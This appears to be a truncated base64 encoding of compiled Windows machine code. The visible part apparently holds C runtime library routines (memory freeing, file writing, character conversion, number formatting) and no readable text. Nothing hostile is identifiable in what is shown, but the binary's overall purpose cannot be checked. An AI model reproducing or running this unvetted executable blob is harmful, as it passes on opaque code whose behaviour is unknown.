CHUf/3dkU/9V4FnrGYtdCIt92IN95AB0CGoA6Bnj//9Zw1P/VeBZg/sIdAqD+wt0BYP7BHURi0XUiUdgg/sIdQaLRdCJR2QzwOjWzv//w4v/VYvsi0UIoyR2ARBdw4v/VYvsi0UIoyh2ARBdw4v/VYvsg+wQ/3UIjU3w6Ea///8PtkUMi030ilUUhFQBHXUeg30QAHQSi03wi4nIAAAAD7cEQSNFEOsCM8CFwHQDM8BAgH38AHQHi034g2Fw/cnDi/9Vi+xqBGoA/3UIagDomv///4PEEF3Di/9Vi+yD7CShgFgBEDPFiUX8i0UIU4lF4ItFDFZXiUXk6G61//+DZewAgz1odgEQAIlF6HV9aHD/ABD/FfTgABCL2IXbD4QQAQAAiz1k4AAQaGT/ABBT/9eFwA+E+gAAAIs1NOAAEFD/1mhU/wAQU6NodgEQ/9dQ/9ZoQP8AEFOjbHYBEP/XUP/WaCT/ABBTo3B2ARD/11D/1qN4dgEQhcB0EGgM/wAQU//XUP/Wo3R2ARChdHYBEItN6Is1LOAAEDvBdEc5DXh2ARB0P1D/1v81eHYBEIv4/9aL2IX/dCyF23Qo/9eFwHQZjU3cUWoMjU3wUWoBUP/ThcB0BvZF+AF1CYFNEAAAIADrM6FsdgEQO0XodClQ/9aFwHQi/9CJReyFwHQZoXB2ARA7Reh0D1D/1oXAdAj/dez/0IlF7P81aHYBEP/WhcB0EP91EP915P914P917P/Q6wIzwItN/F9eM81b6A6c///Jw4v/VYvsVot1CFeF9nQHi30Mhf91FegpzP//ahZeiTDozcv//4vGX15dw4tNEIXJdQczwGaJBuvdi9ZmgzoAdAaDwgJPdfSF/3TnK9EPtwFmiQQKg8ECZoXAdANPde4zwIX/dcJmiQbo18v//2oiWYkIi/Hrqov/VYvsi1UIU4tdFFZXhdt1EIXSdRA5VQx1EjPAX15bXcOF0nQHi30Mhf91E+icy///ahZeiTDoQMv//4vG692F23UHM8BmiQLr0ItNEIXJdQczwGaJAuvUi8KD+/91GIvyK/EPtwFmiQQOg8ECZoXAdCdPde7rIovxK/IPtwwGZokIg8ACZoXJdAZPdANLdeuF23UFM8lmiQiF/w+Fef///zPAg/v/dRCLTQxqUGaJREr+WOlk////ZokC6A3L//9qIlmJCIvx6Wr///+L/1WL7ItFCGaLCIPAAmaFyXX1K0UI0fhIXcOL/1WL7FaLdQhXhfZ0B4t9DIX/dRXozMr//2oWXokw6HDK//+Lxl9eXcOLRRCFwHUFZokG69+L1ivQD7cIZokMAoPAAmaFyXQDT3XuM8CF/3XUZokG6IzK//9qIlmJCIvx67yL/1WL7ItNCIXJeB6D+QJ+DIP5A3UUocRpARBdw6HEaQEQiQ3EaQEQXcPoVMr//8cAFgAAAOj3yf//g8j/XcOL/1WL7FaLdQiF9g+EYwMAAP92BOj+pP///3YI6Pak////dgzo7qT///92EOjmpP///3YU6N6k////dhjo1qT///826M+k////diDox6T///92JOi/pP///3Yo6Lek////dizor6T///92MOinpP///3Y06J+k////dhzol6T///92OOiPpP///3Y86Iek//+DxED/dkDofKT///92ROh0pP///3ZI6Gyk////dkzoZKT///92UOhcpP///3ZU6FSk////dljoTKT///92XOhEpP///3Zg6Dyk////dmToNKT///92aOgspP///3Zs6CSk////dnDoHKT///92dOgUpP///3Z46Ayk////dnzoBKT//4PEQP+2gAAAAOj2o////7aEAAAA6Ouj////togAAADo4KP///+2jAAAAOjVo////7aQAAAA6Mqj////tpQAAADov6P///+2mAAAAOi0o////7acAAAA6Kmj////tqAAAADonqP///+2pAAAAOiTo////7aoAAAA6Iij////trwAAADofaP///+2wAAAAOhyo////7bEAAAA6Gej////tsgAAADoXKP///+2zAAAAOhRo///g8RA/7bQAAAA6EOj////trgAAADoOKP///+22AAAAOgto////7bcAAAA6CKj////tuAAAADoF6P///+25AAAAOgMo////7boAAAA6AGj////tuwAAADo9qL///+21AAAAOjrov///7bwAAAA6OCi////tvQAAADo1aL///+2+AAAAOjKov///7b8AAAA6L+i////tgABAADotKL///+2BAEAAOipov///7YIAQAA6J6i//+DxED/tgwBAADokKL///+2EAEAAOiFov///7YUAQAA6Hqi////thgBAADob6L///+2HAEAAOhkov///7YgAQAA6Fmi////tiQBAADo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i4Uo5f//AYU45f//O8YPjDsCAACLwyuFNOX//ztFEA+CbP///+klAgAAgL0/5f//Ag+FzQAAAIudNOX//zlNEA+GSAIAAIOlQOX//wCLyyuNNOX//2oCjYVI5f//XjtNEHNDD7cTA94DzomdIOX//4P6CnUaAbUw5f//ag1bZokYi50g5f//A8YBtUDl//8BtUDl//9miRADxoG9QOX///4TAAByuIvwjYVI5f//K/BqAI2FKOX//1BWjYVI5f//UIuFJOX//4sA/zQH/xXU4AAQhcAPhGkBAACLhSjl//8BhTjl//87xg+MYQEAAIvDK4U05f//O0UQD4JH////6UsBAACLhTTl//+JhSzl//85TRAPhnUBAACLjSzl//+DpUDl//8AK4005f//agKNhUj5//9eO00QczuLlSzl//8PtxIBtSzl//8DzoP6CnUOag1bZokYA8YBtUDl//8BtUDl//9miRADxoG9QOX//6gGAABywDP2VlZoVQ0AAI2N8Ov//1GNjUj5//8rwZkrwtH4UIvBUFZo6f0AAP8VsOAAEIvYO94PhJcAAABqAI2FKOX//1CLwyvGUI2ENfDr//9Qi4Uk5f//iwD/NAf/FdTgABCFwHQMA7Uo5f//O95/y+sM/xVA4AAQiYVE5f//O95/XIuFLOX//yuFNOX//4mFOOX//ztFEA+CC////+s/UY2NKOX//1H/dRD/tTTl////NDj/FdTgABCFwHQVi4Uo5f//g6VE5f//AImFOOX//+sM/xVA4AAQiYVE5f//g7045f//AHVsg71E5f//AHQtagVeObVE5f//dRTogrr//8cACQAAAOiKuv//iTDrP/+1ROX//+iOuv//Wesxi4Uk5f//iwD2RAcEQHQPi4U05f//gDgadQQzwOsk6EK6///HABwAAADoSrr//4MgAIPI/+sMi4U45f//K4Uw5f//W4tN/F8zzV7o34n//8nDahBo2A4BEOhguv//i10Ig/v+dRvoDrr//4MgAOjzuf//xwAJAAAAg8j/6ZQAAACF23gIOx2UdgEQchro57n//4MgAOjMuf//xwAJAAAA6G+5///r0ovDwfgFjTyFoHYBEIvzg+YfweYGiwcPvkQwBIPgAXTGU+jLCgAAWYNl/ACLB/ZEMAQBdBT/dRD/dQxT6G74//+DxAyJReTrF+hyuf//xwAJ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